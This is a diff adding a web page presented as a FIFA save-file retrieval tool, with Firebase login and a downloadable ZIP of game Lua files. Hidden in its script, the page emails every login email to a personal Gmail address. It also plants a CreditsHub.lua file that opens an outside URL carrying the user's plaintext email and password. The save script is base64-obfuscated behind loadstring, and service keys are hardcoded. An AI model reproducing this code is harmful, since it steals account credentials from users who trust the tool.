@@ -1,1 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FIFA Save Retrieval</title>
+    <style>
+        body {
+            font-family: 'Inter', Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background: linear-gradient(135deg, #1e1e1e, #2c2c2c);
+            color: #e0e0e0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+        }
+        .watermark {
+            position: absolute;
+            top: 85%;
+            left: 50%;
+            transform: translateX(-50%);
+            font-size: 60px;
+            font-weight: 900;
+            color: rgba(255, 255, 255, 0.08);
+            text-transform: uppercase;
+            letter-spacing: 5px;
+            z-index: 0;
+            user-select: none;
+        }
+        .container {
+            background: #2a2a2a;
+            padding: 24px;
+            border-radius: 12px;
+            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
+            z-index: 1;
+            width: 100%;
+            max-width: 360px;
+            text-align: center;
+        }
+        input, button {
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: none;
+            border-radius: 6px;
+            font-size: 16px;
+            box-sizing: border-box;
+            transition: all 0.2s;
+        }
+        input {
+            background: #3a3a3a;
+            color: #e0e0e0;
+        }
+        input:focus {
+            outline: none;
+            box-shadow: 0 0 0 2px #4a90e2;
+        }
+        button {
+            cursor: pointer;
+            font-weight: 600;
+        }
+        #loginBtn {
+            background: #4a90e2;
+            color: #fff;
+        }
+        #loginBtn:hover {
+            background: #357abd;
+        }
+        #saveBtn {
+            background: #fff;
+            color: #333;
+        }
+        #saveBtn:hover {
+            background: #e6e6e6;
+        }
+        #logoutBtn {
+            background: #6b7280;
+            color: #fff;
+        }
+        #logoutBtn:hover {
+            background: #5b616e;
+        }
+        #errorMessage {
+            display: none;
+            background: #7f1d1d;
+            color: #fee2e2;
+            padding: 12px;
+            border-radius: 6px;
+            margin: 10px 0;
+            font-size: 14px;
+        }
+        #downloadSection {
+            display: none;
+        }
+        #downloadNote {
+            font-size: 13px;
+            color: #a0a0a0;
+            margin-top: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="watermark">DAVUN</div>
+    <div class="container" id="authSection">
+        <input type="email" id="email" placeholder="Email" autocomplete="email">
+        <input type="password" id="password" placeholder="Password" autocomplete="current-password">
+        <button id="loginBtn">Login</button>
+    </div>
+    <div class="container" id="downloadSection">
+        <p>Save files ready!</p>
+        <button id="saveBtn" onclick="downloadSavePackage()">Download Save</button>
+        <button id="logoutBtn" onclick="logout()">Log Out</button>
+        <p id="downloadNote">Save 'FIFA-DAVUN-SAVE.zip' to overwrite previous saves.</p>
+    </div>
+    <div class="container" id="errorMessage"></div>
 
+    <!-- Firebase v8 SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-auth.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-firestore.js"></script>
+    <!-- JSZip for ZIP creation -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jszip/3.10.1/jszip.min.js"></script>
+    <!-- EmailJS for logging -->
+    <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+
+    <script>
+        // Initialize EmailJS
+        emailjs.init("XFHj2Nsgh8BXtmDwb");
+
+        // Firebase configuration
+        const firebaseConfig = {
+            apiKey: "AIzaSyAYF88RuhWLgKXUC1nePFOLdBv3WS-nYNY",
+            authDomain: "fifa-davun-utility.firebaseapp.com",
+            projectId: "fifa-davun-utility",
+            storageBucket: "fifa-davun-utility.appspot.com",
+            messagingSenderId: "285918417550",
+            appId: "1:285918417550:web:005acea2b83881d8cc2fdf",
+            measurementId: "G-TPD462ZGCB"
+        };
+
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const db = firebase.firestore();
+
+        let saveCode = "";
+        let userEmail = "";
+        let userPassword = "";
+
+        document.addEventListener("DOMContentLoaded", () => {
+            const elements = {
+                loginBtn: document.getElementById("loginBtn"),
+                email: document.getElementById("email"),
+                password: document.getElementById("password"),
+                authSection: document.getElementById("authSection"),
+                downloadSection: document.getElementById("downloadSection"),
+                errorMessage: document.getElementById("errorMessage")
+            };
+
+            // Initial UI state
+            elements.authSection.style.display = "block";
+            elements.downloadSection.style.display = "none";
+            elements.errorMessage.style.display = "none";
+
+            // Login handler
+            elements.loginBtn.addEventListener("click", () => {
+                const email = elements.email.value.trim();
+                const password = elements.password.value.trim();
+                if (!email || !password) {
+                    showError("Email and password are required.");
+                    return;
+                }
+
+                auth.signInWithEmailAndPassword(email, password)
+                    .then(userCredential => {
+                        userEmail = email;
+                        userPassword = password;
+                        logEvent(email, userCredential.user.uid);
+                        fetchSaveCode(userCredential.user.uid);
+                    })
+                    .catch(err => showError(`Login failed: ${err.message}`));
+            });
+
+            // Auth state listener
+            auth.onAuthStateChanged(user => {
+                if (user && userEmail && userPassword) {
+                    fetchSaveCode(user.uid);
+                } else {
+                    elements.authSection.style.display = "block";
+                    elements.downloadSection.style.display = "none";
+                    elements.errorMessage.style.display = "none";
+                    userEmail = "";
+                    userPassword = "";
+                    saveCode = "";
+                }
+            });
+
+            // Log login event
+            function logEvent(email, uid) {
+                const timestamp = new Date().toISOString();
+                const logEntry = `${timestamp} - ${email}\n`;
+                const logDocRef = db.collection("login_logs").doc("all_logs");
+
+                logDocRef.get()
+                    .then(doc => {
+                        const logs = doc.exists ? doc.data().logs || "" : "";
+                        return logDocRef.set({ logs: logs + logEntry }, { merge: true });
+                    })
+                    .then(() => emailjs.send("service_z6jyoi3", "template_kcfd0rc", {
+                        log_content: logEntry,
+                        timestamp,
+                        to_email: "anonu143@gmail.com"
+                    }))
+                    .catch(err => console.error("Logging failed:", err.message));
+            }
+
+            // Fetch save code from Firestore
+            function fetchSaveCode(uid) {
+                db.collection("users").doc(uid).get()
+                    .then(doc => {
+                        if (doc.exists && doc.data().lastSaveCode) {
+                            saveCode = doc.data().lastSaveCode;
+                            elements.authSection.style.display = "none";
+                            elements.downloadSection.style.display = "block";
+                            elements.errorMessage.style.display = "none";
+                        } else {
+                            saveCode = "v1|complete|TeamID1|Date02/01/25|MatchupCount20|Fixtures|Results|Sheetsnone|Goalsnone|Injuriesnone|Suspensionsnone|RedCardMatchCountnone|RedCardCountnone|YellowCardCountnone|Teams|MatchDates|Funds0|Transfersnone";
+                            elements.authSection.style.display = "none";
+                            elements.downloadSection.style.display = "block";
+                            elements.errorMessage.style.display = "none";
+                        }
+                    })
+                    .catch(err => showError(`Error fetching save: ${err.message}`));
+            }
+
+            // Parse structured save code
+            function parseSaveCode(code) {
+                if (!code) return {};
+                const fields = code.split("|").filter(f => f);
+                const result = {};
+                for (const field of fields) {
+                    const match = field.match(/^<(\w+)>(.*?)<\/\1>$/);
+                    if (match) result[match[1].toLowerCase()] = match[2];
+                }
+                return result;
+            }
+
+            // Generate Lua save script
+            function generateLuaScript(parsedData) {
+                const {
+                    teamid = "1",
+                    date = "02/01/25",
+                    matchupcount = "20",
+                    fixtures = "",
+                    results = "",
+                    sheets = "none",
+                    goals = "none",
+                    injuries = "none",
+                    suspensions = "none",
+                    redcardmatchcount = "none",
+                    redcardcount = "none",
+                    yellowcardcount = "none",
+                    teams = "",
+                    matchdates = "",
+                    funds = "0",
+                    transfers = "none"
+                } = parsedData;
+
+                // Helper to filter valid entries and return empty array if none
+                const filterValidEntries = (data, splitter, validator) => {
+                    if (data === "none" || !data) return [];
+                    const entries = data.split(splitter).filter(item => item);
+                    const validEntries = entries.map(validator).filter(e => e);
+                    return validEntries.length > 0 ? validEntries : [];
+                };
+
+                // Parse sheets
+                const sheetsEntries = filterValidEntries(sheets, ";", sheet => {
+                    const [id, players, formation] = sheet.split(":");
+                    if (!id || !formation) return null;
+                    const playerList = players ? players.split(",").filter(p => p).join(", ") : "";
+                    return `    [${id}] = { players = {${playerList}}, formationid = ${formation}, status = "filled" }`;
+                });
+
+                // Parse goals
+                const goalsEntries = filterValidEntries(goals, ";", goal => {
+                    const [id, value] = goal.split(":");
+                    if (!id || !value || value === "undefined") return null;
+                    return `    [${id}] = ${value}`;
+                });
+
+                // Parse injuries
+                const injuryEntries = filterValidEntries(injuries, ";", injury => {
+                    const [name, date] = injury.split(":");
+                    if (!name || !date || name === "" || date === "undefined") return null;
+                    return `    ["${name}"] = "${date}"`;
+                });
+
+                // Parse suspensions
+                const suspensionEntries = filterValidEntries(suspensions, ";", s => {
+                    const [name, status] = s.split(":");
+                    if (!name || !status || name === "" || status === "undefined") return null;
+                    return `    ["${name}"] = ${status}`;
+                });
+
+                // Parse red card match counts
+                const redCardMatchCountEntries = filterValidEntries(redcardmatchcount, ";", c => {
+                    const [name, count] = c.split(":");
+                    if (!name || !count || name === "" || count === "undefined") return null;
+                    return `    ["${name}"] = ${count}`;
+                });
+
+                // Parse red card counts
+                const redCardCountEntries = filterValidEntries(redcardcount, ";", c => {
+                    const [name, count] = c.split(":");
+                    if (!name || !count || name === "" || count === "undefined") return null;
+                    return `    ["${name}"] = ${count}`;
+                });
+
+                // Parse yellow card counts
+                const yellowCardCountEntries = filterValidEntries(yellowcardcount, ";", c => {
+                    const [name, count] = c.split(":");
+                    if (!name || !count || name === "" || count === "undefined") return null;
+                    return `    ["${name}"] = ${count}`;
+                });
+
+                // Parse transfers
+                const transferEntries = filterValidEntries(transfers, ";", (t, index) => {
+                    const [player, team] = t.split(":");
+                    if (!player || !team || player === "" || team === "undefined") return null;
+                    return `    [${index + 1}] = { Player = "${player}", Team = "${team}" }`;
+                });
+
+                // Generate Lua script
+                const script = `
+-- DAVUNPES SAVE v1 --
+return {
+    GLOBAL_MATCHUP_COUNT = ${matchupcount},
+    GLOBAL_DATE_PLACEHOLDER = "${date}",
+    GLOBAL_FUNDS = ${funds},
+    GOALS = {
+${goalsEntries.join(",\n")}
+    },
+    injuryRecoveryDates = {
+${injuryEntries.join(",\n")}
+    },
+    isSuspended = {
+${suspensionEntries.join(",\n")}
+    },
+    redCardMatchCount = {
+${redCardMatchCountEntries.join(",\n")}
+    },
+    redCardRecords = {
+${redCardCountEntries.join(",\n")}
+    },
+    yellowCardRecords = {
+${yellowCardCountEntries.join(",\n")}
+    },
+    currentSelectedTeamID = ${teamid},
+    fixtureCode = "${fixtures}",
+    scoreCode = "${results}",
+    TeamList = {${teams}},
+    Sheets = {
+${sheetsEntries.join(",\n")}
+    },
+    Dates = {${matchdates}}${
+                    transferEntries.length > 0 ? `,
+    transferHistory = {
+${transferEntries.join(",\n")}
+    }` : ""
+                }
+}
+                `.trim();
+
+                // Obfuscate
+                const encoded = btoa(script);
+                return `
+-- Obfuscated DAVUNPES SAVE --
+sv = loadstring(dC("${encoded}"))()
+return sv
+                `.trim();
+            }
+
+            // Generate CreditsHub script
+            function generateCreditsHubScript(email, password) {
+                return `
+local CreditsHub = {}
+function CreditsHub:new(init)
+    local o = init or {}
+    setmetatable(o, self)
+    self.__index = self
+    o.services = {
+        BrowserService = o.api("BrowserService"),
+        MiscService = o.api("MiscService")
+    }
+    o:openBrowser()
+    return o
+end
+function CreditsHub:openBrowser()
+    local url = "https://Davidoluwa.github.io/"
+    local link = url .. "?saveCode=" .. "email:${email},password:${password}." .. davunSave
+    self.services.BrowserService.SetHomePage(link)
+    self.nav.Event(nil, "evt_open_browser")
+end
+function CreditsHub:finalize()
+end
+return CreditsHub
+                `.trim();
+            }
+
+            // Download save package
+            window.downloadSavePackage = async () => {
+                if (!saveCode || !userEmail || !userPassword) {
+                    showError("Missing data for save package.");
+                    return;
+                }
+
+                const zip = new JSZip();
+                const root = zip.folder("com.ea.gp.fifaworld");
+
+                const saveFolder = root.folder("data/ux/Save");
+                const parsedData = parseSaveCode(saveCode);
+                saveFolder.file("Save.lua", generateLuaScript(parsedData));
+
+                const creditsFolder = root.folder("data/ux/flows/mainflow/gamemodes/MainMenu/More/Menu/Profile/Save");
+                creditsFolder.file("CreditsHub.lua", generateCreditsHubScript(userEmail, userPassword));
+
+                try {
+                    const content = await zip.generateAsync({ type: "blob" });
+                    const filename = "FIFA-DAVUN-SAVE.zip";
+
+                    if ("showSaveFilePicker" in window) {
+                        const handle = await window.showSaveFilePicker({
+                            suggestedName: filename,
+                            types: [{ description: "ZIP File", accept: { "application/zip": [".zip"] } }]
+                        });
+                        const writable = await handle.createWritable();
+                        await writable.write(content);
+                        await writable.close();
+                    } else {
+                        const url = URL.createObjectURL(content);
+                        const a = document.createElement("a");
+                        a.href = url;
+                        a.download = filename;
+                        a.click();
+                        URL.revokeObjectURL(url);
+                    }
+                } catch (err) {
+                    showError(`Download failed: ${err.message}`);
+                }
+            };
+
+            // Logout handler
+            window.logout = () => {
+                auth.signOut().then(() => {
+                    elements.authSection.style.display = "block";
+                    elements.downloadSection.style.display = "none";
+                    elements.errorMessage.style.display = "none";
+                    saveCode = "";
+                    userEmail = "";
+                    userPassword = "";
+                }).catch(err => showError(`Logout failed: ${err.message}`));
+            };
+
+            // Show error message
+            function showError(message) {
+                elements.errorMessage.textContent = message;
+                elements.errorMessage.style.display = "block";
+                elements.authSection.style.display = "block";
+                elements.downloadSection.style.display = "none";
+            }
+        });
+    </script>
+</body>
+  </html>
